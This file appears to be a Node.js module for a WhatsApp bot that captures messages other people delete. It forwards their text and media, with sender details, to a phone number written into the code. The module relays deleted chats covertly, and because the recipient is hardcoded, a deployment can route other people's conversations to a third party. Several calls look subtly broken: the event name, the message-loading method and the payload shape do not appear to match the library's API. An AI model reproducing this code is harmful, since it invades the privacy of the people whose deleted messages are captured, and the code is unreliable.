const fs = require('fs');
const { downloadMediaMessage } = require('@whiskeysockets/baileys');

// Function to handle deleted messages
async function handleDeletedMessage(sock, message) {
    if (message.key && message.key.remoteJid) {
        const deletedMessage = JSON.parse(JSON.stringify(message));

        // Prepare the forwarding message
        let forwardContent = {
            text: `🚨 *DELETED MESSAGE DETECTED* 🚨

` +
                  `From: ${deletedMessage.key.remoteJid}
` +
                  `Sender: ${deletedMessage.key.fromMe ? 'Me' : deletedMessage.pushName || deletedMessage.key.participant}

` +
                  `Message Type: ${deletedMessage.message ? Object.keys(deletedMessage.message)[0] : 'Unknown'}

`
        };

        // Handle different types of messages
        if (deletedMessage.message) {
            if (deletedMessage.message.conversation) {
                forwardContent.text += `Content: ${deletedMessage.message.conversation}`;
            } else if (deletedMessage.message.extendedTextMessage) {
                forwardContent.text += `Content: ${deletedMessage.message.extendedTextMessage.text}`;
            } else if (deletedMessage.message.imageMessage || deletedMessage.message.videoMessage || deletedMessage.message.documentMessage) {
                forwardContent.text += `Content: Media file (see below)`;
                
                // Download and attach the media
                const stream = await downloadMediaMessage(deletedMessage, 'buffer');
                forwardContent.media = stream;
                
                if (deletedMessage.message.imageMessage) {
                    forwardContent.type = 'image';
                    forwardContent.caption = deletedMessage.message.imageMessage.caption || '';
                } else if (deletedMessage.message.videoMessage) {
                    forwardContent.type = 'video';
                    forwardContent.caption = deletedMessage.message.videoMessage.caption || '';
                } else {
                    forwardContent.type = 'document';
                    forwardContent.fileName = deletedMessage.message.documentMessage.fileName || 'document';
                }
            }
        }

        // Send the deleted message info to the owner
        await sock.sendMessage('2347013159244@s.whatsapp.net', forwardContent);
    }
}

// Set up the message deletion listener
function setupAntidelete(sock) {
    sock.ev.on('message.delete', async (deletedMessage) => {
        // Check if the deleted message is in our cache
        const key = deletedMessage.key;
        const cachedMessage = await sock.loadMessage(key.remoteJid, key.id);
        
        if (cachedMessage) {
            await handleDeletedMessage(sock, cachedMessage);
        }
    });
}

module.exports = { setupAntidelete };